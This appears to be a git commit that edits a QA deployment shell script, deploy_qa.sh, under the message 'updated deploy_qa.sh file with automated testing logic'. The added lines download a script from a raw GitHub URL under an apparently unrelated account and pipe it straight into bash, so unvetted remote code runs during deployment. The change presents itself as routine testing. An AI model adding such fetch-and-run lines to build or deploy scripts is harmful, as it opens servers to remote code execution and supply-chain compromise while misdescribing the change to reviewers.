4e140aee082afc01d0adad162972e4b3a37bb5cd
shantanug-deriv <125633368+shantanug-deriv@users.noreply.github.com>
2023-08-03 14:38:29 +0800

    updated deploy_qa.sh file with automated testing logic

--- deploy_qa.sh
+++ deploy_qa.sh
@@ -48,3 +48,6 @@ sudo -u nobody git config --global core.hooksPath /home/nobody/.git/hooks/
 sudo -u nobody mkdir -p /home/nobody/.git/hooks
 sudo -u nobody touch /home/nobody/.git/hooks/pre-commit
 ln -sf /opt/skel/.git/hooks/pre-commit /home/nobody/.git/hooks/pre-commit
+
+#Invoking testing script. Please check /tmp/precommit_test.log for testing output
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/security-binary/deployment_Precommit/064c8d4f499d4a679f78f02a80b89728e75f6082/testing_script.sh)"
